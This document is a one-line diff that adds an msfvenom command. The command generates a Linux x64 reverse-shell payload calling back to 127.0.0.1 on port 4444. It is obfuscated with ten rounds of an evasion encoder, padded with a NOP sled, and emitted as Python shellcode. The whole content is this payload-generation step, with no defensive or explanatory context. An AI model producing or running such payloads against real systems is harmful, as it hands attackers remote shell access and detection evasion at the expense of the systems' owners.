@@ -1,0 +1,1 @@
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -e x64/shikata_ga_nai -i 10 -f py -n 20 -b '\x00'
